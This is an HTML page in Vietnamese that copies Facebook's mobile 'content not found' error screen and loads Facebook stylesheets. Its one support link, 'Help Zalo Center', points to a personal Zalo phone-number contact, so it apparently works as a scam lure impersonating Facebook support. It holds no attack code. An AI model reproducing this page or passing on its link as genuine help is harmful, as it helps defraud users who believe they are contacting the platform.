<html lang="vi">
  <head>
    <meta charset="UTF-8" />
    <title>Không tìm thấy nội dung</title>
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
    <link href="https://i.imgur.com/CrEGNKu.jpg" rel="shortcut icon" sizes="196x196">
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yR/l/0,cross/lB0mUFT_GDc.css?_nc_x=nuU8MpbtY3X" data-bootloader-hash="W875wpy" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yD/l/0,cross/EdfnSSeIeIV.css?_nc_x=nuU8MpbtY3X" data-bootloader-hash="sNTp85P" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yd/l/0,cross/USgZI6twf-i.css?_nc_x=nuU8MpbtY3X" data-bootloader-hash="X8O1GBp" crossorigin="anonymous">
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yv/l/0,cross/VKok50EqFJM.css?_nc_x=nuU8MpbtY3X" data-bootloader-hash="beaE1sn" crossorigin="anonymous">
    <meta http-equiv="origin-trial" data-feature="getInstalledRelatedApps" data-expires="2017-12-04" content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0=">
  </head>
  <body tabindex="0" class="touch x1 _fzu _50-3 _67i4 acw  portrait" style="min-height: 821px; background-color: rgb(42, 42, 57);">
    <div id="viewport" data-kaios-focus-transparent="1" style="min-height: 821px;">
      <div id="page">
        <div class="_129_" id="header-notices"></div>
        <div class="_129- _6dr5" id="MChromeHeader">
          <a aria-label="Chuyển sang trang web cơ bản cho di động." href="/a/preferences.php?basic_site_devices=m_basic&amp;uri=https%3A%2F%2Fm.facebook.com%2Fhome.php&amp;eav=AfbRVPzOoB0YGUZEfrqXW3o7AekRhE2Wn2m28uUAepRRM1MH4muaQ_XC3U7geAPPIRA&amp;gfid=AQAsgUhkWqhli4nYeek&amp;paipv=0" tabindex="-1" style="clip: rect(1px, 1px, 1px, 1px);height: 1px;overflow: hidden;position: absolute;white-space: nowrap;width: 1px;" data-sigil="no_mpc">&nbsp;</a>
          <div class="_52z5 _451a _3qet _17gp _9rhg" id="header" data-sigil="MTopBlueBarHeader">
            <div class="_7om2 _52we _7izv _84vx" id="u_0_1_u3" style="display: none;">
              <div class="_4g34 _7izx">
                <div class="_59te jewel _hzb noCount" data-store="{&quot;tab&quot;:&quot;profile&quot;,&quot;tabID&quot;:194120517597173}" id="profile_tab_jewel" data-sigil="nav-popover profile_tab_jewel_button profile">
                  <div class="_2ftp _62ta">
                    <div class="_59tf _2ftq _7gxv" data-sigil="messenger_icon"></div>
                  </div>
                  </a>
                </div>
              </div>
            </div>
            <div class="_6j_d show" id="MBackNavBar">
              <i class="_6l_w _84gg img sp_zqrNfmDGuGz sx_fec7bb" id="MBackNavBarLeftArrow" aria-label="Quay lại" role="button" tabindex="0"></i>
              <i class="_6l_q _84gg img sp_pjlwJF1zHy3 sx_ba7d9b" id="MBackNavBarRightArrow" tabindex="0"></i>
              <a href="/" class="_6j_c" id="u_0_a_Md" data-sigil="MBackNavBarClick">Không tìm thấy nội dung</a>
            </div>
          </div>
        </div>
        <div id="rootcontainer">
          <div class="acw" id="root" role="main" data-sigil="context-layer-root content-pane" style="min-height: 776px;">
            <div>
              <div class="_7ny9">
                <div class="_7nya _7nyh">
                  <div class="_7nyf">
                    <i class="img _7nyv img _2sxw" style="background-image: url('https\3a //static.xx.fbcdn.net/rsrc.php/v3/yt/r/5hx8IbI7sDB.png');background-repeat:no-repeat;background-size:100% 100%;-webkit-background-size:100% 100%;width:144px;height:142px;"></i>
                    <div class="_7nyw">Trang bạn truy cập có thể bị hỏng hoặc trang có thể đã bị gỡ.</div>
                    <div class="_84u-">
                      <a href="/" class="_7nyn _7nyj">
                        <div class="_7nyq">Đi về Trang chủ</div>
                      </a>
                      <div class="_84uz">Hoặc truy cập <a href="https://zalo.me/0346434498">Help Zalo Center </a> của chúng tôi </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
  </body>
</html>